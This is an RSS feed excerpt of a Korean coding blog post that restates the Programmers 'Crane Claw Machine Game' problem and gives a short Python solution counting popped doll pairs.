      <content:encoded><![CDATA[<h1 id="크레인-인형뽑기-게임"><a href="#크레인-인형뽑기-게임" class="headerlink" title="크레인 인형뽑기 게임"></a><a href="https://programmers.co.kr/learn/courses/30/lessons/64061">크레인 인형뽑기 게임</a></h1><h2 id="문제-설명"><a href="#문제-설명" class="headerlink" title="문제 설명"></a>문제 설명</h2><p>게임개발자인 “죠르디”는 크레인 인형뽑기 기계를 모바일 게임으로 만들려고 합니다.<br>“죠르디”는 게임의 재미를 높이기 위해 화면 구성과 규칙을 다음과 같이 게임 로직에 반영하려고 합니다.</p><p><img src="/images/pasted-601.png"></p><p>게임 화면은 “1 x 1” 크기의 칸들로 이루어진 “N x N” 크기의 정사각 격자이며 위쪽에는 크레인이 있고 오른쪽에는 바구니가 있습니다. (위 그림은 “5 x 5” 크기의 예시입니다). 각 격자 칸에는 다양한 인형이 들어 있으며 인형이 없는 칸은 빈칸입니다. 모든 인형은 “1 x 1” 크기의 격자 한 칸을 차지하며 격자의 가장 아래 칸부터 차곡차곡 쌓여 있습니다. 게임 사용자는 크레인을 좌우로 움직여서 멈춘 위치에서 가장 위에 있는 인형을 집어 올릴 수 있습니다. 집어 올린 인형은 바구니에 쌓이게 되는 데, 이때 바구니의 가장 아래 칸부터 인형이 순서대로 쌓이게 됩니다. 다음 그림은 [1번, 5번, 3번] 위치에서 순서대로 인형을 집어 올려 바구니에 담은 모습입니다.</p><p><img src="/images/pasted-602.png"></p><p>만약 같은 모양의 인형 두 개가 바구니에 연속해서 쌓이게 되면 두 인형은 터뜨려지면서 바구니에서 사라지게 됩니다. 위 상태에서 이어서 [5번] 위치에서 인형을 집어 바구니에 쌓으면 같은 모양 인형 두 개가 없어집니다.</p><p><img src="/images/pasted-604.png"></p><p>크레인 작동 시 인형이 집어지지 않는 경우는 없으나 만약 인형이 없는 곳에서 크레인을 작동시키는 경우에는 아무런 일도 일어나지 않습니다. 또한 바구니는 모든 인형이 들어갈 수 있을 만큼 충분히 크다고 가정합니다. (그림에서는 화면표시 제약으로 5칸만으로 표현하였음)</p><p>게임 화면의 격자의 상태가 담긴 2차원 배열 board와 인형을 집기 위해 크레인을 작동시킨 위치가 담긴 배열 moves가 매개변수로 주어질 때, 크레인을 모두 작동시킨 후 터트려져 사라진 인형의 개수를 return 하도록 solution 함수를 완성해주세요.</p><h3 id="제한사항"><a href="#제한사항" class="headerlink" title="제한사항"></a>제한사항</h3><ul><li>board 배열은 2차원 배열로 크기는 “5 x 5” 이상 “30 x 30” 이하입니다.</li><li>board의 각 칸에는 0 이상 100 이하인 정수가 담겨있습니다.<ul><li>0은 빈 칸을 나타냅니다.</li><li>1 ~ 100의 각 숫자는 각기 다른 인형의 모양을 의미하며 같은 숫자는 같은 모양의 인형을 나타냅니다.</li></ul></li><li>moves 배열의 크기는 1 이상 1,000 이하입니다.</li><li>moves 배열 각 원소들의 값은 1 이상이며 board 배열의 가로 크기 이하인 자연수입니다.</li></ul><h2 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solution</span>(<span class="params">board, moves</span>):</span></span><br><span class="line">    basket = []</span><br><span class="line">    answer = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> move <span class="keyword">in</span> moves:</span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(board)):</span><br><span class="line">            <span class="keyword">if</span> board[idx][move<span class="number">-1</span>] &gt; <span class="number">0</span>:</span><br><span class="line">                basket.append(board[idx][move<span class="number">-1</span>])</span><br><span class="line">                board[idx][move<span class="number">-1</span>] = <span class="number">0</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> basket[<span class="number">-1</span>:] == basket[<span class="number">-2</span>:<span class="number">-1</span>]:</span><br><span class="line">                    answer += basket[<span class="number">-1</span>:]</span><br><span class="line">                    basket = basket[:<span class="number">-2</span>]</span><br><span class="line">                    </span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">len</span>(answer)*<span class="number">2</span></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      
      <comments>https://lrtk-coder.github.io/2021/06/03/Programmers-Level-1-%ED%81%AC%EB%A0%88%EC%9D%B8-%EC%9D%B8%ED%98%95%EB%BD%91%EA%B8%B0-%EA%B2%8C%EC%9E%84/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
